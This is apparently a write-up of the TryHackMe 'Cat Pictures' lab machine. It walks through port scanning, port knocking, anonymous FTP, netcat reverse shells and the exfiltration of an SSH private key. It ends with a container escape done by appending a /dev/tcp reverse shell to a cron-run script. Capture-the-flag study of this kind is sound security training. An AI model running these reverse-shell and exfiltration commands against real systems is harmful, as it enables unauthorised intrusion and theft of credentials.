# Cat Pictures THM

### Description

- Difficulty: easy
- O.S: linux

### Enumeration

First I checked the connection with a ping to the machine

![Ping](Img/Ping.png)

Based on the ttl I know is a linux machine, next step is scan the ports and services of the machine with nmap.

```bash
nmap <IP> -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allports
```

![nmap-allports](Img/Nmap-allports.png)

```bash
nmap <IP> -p22,4420,8080 -sCV -oN targeted
```

![nmap-targeted](Img/Nmap-targeted.png)

The results of nmap are:
- 22 <- ssh - I don't have any credentials.
- 4420 <- nvm-express - Searching information about the service I found that is a NVMe storage service that is accessible on the network
- 8080 <- Web page
### NVM-express scan

First I'm going to check if I can access to the NVMe service because it can have access to sensitive data, unfortunately the service ask me for credentials

### Web scan

I had access to the web page in the 8080 port and looks like this:

![web](Img/web.png)

Browsing in the web page I found this blog:

![post](Img/post.png)

### Port Knocking exploitation

In this post knock knock makes reference to port knocking, port knocking is a technique that if you make a connection to some ports, you can discover a port that has been hidden with a firewall.

Searching for information I found a python script in this [repository](https://github.com/eliemoutran/KnockIt) and I executed it like this:

```bash
python3 knockit.py -b <IP> 1111 2222 3333 4444
```

After I executed the exploit I have done another nmap scan, that scan reveled me that there is a FTP service running.

![ftp-scan](Img/ftp-scan.png)
### FTP enumeration

I entered to the FTP service with a anonymous session and I saw a file named note.txt and I downloaded to my machine.
### NVMe enumeration

The note contains a credential for the NVMe service so I can connect with netcat.

```bash
nc -nv <IP> 4420
```

I'm inside the machine, I saw that the machine have mkfifo and netcat so I made a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f
```

Now I'm not in a limited shell, I can move through the directories and  I can execute the runme script.

The runme script ask me for password so I through to see the strings of the file, to do that I have to move the file to my machine, for do that I used netcat

```bash
# our machine
nc -lvnp <PORT> > runme
# victim machine
nc <IP> <PORT> < /home/catlover/runme
```

In the strings I have found a plain text word that seems a password.

![passwd](Img/passwd.png)

Using the obtained credential I can execute the script and the script created a private ssh key.

![script](Img/script.png)

I send with netcat the private key to my machine.

```bash
# our machine
nc -lvnp <PORT> > id_rsa
# victim machine
nc <IP> <PORT> < /home/catlover/id_rsa
```

### SSH

With the obtained key I can connect to the machine with SSH but before I have to give the right permissions 

```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa root@<IP>
```

Here I can see the first flag, but where's the other? Looking around the machine I saw that I'm in a container, for exit the container I saw a script named clean.sh in the /opt/clean directory, this script seems to be executed repetitively so I put a reverse shell inside it.
### Exit the container

```bash
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> clean.sh
```

![root](Img/root.png)

I waited some seconds and I become root user, this way I can read the flag.

### Lessons learned

- I learned what is port knocking and how to explote it.
- Anonymous FTP login can make serious sensitive data leak.
- Script that are repetitively executed can be dangerous with bad permissions and can be a way to fully root compromise a system.

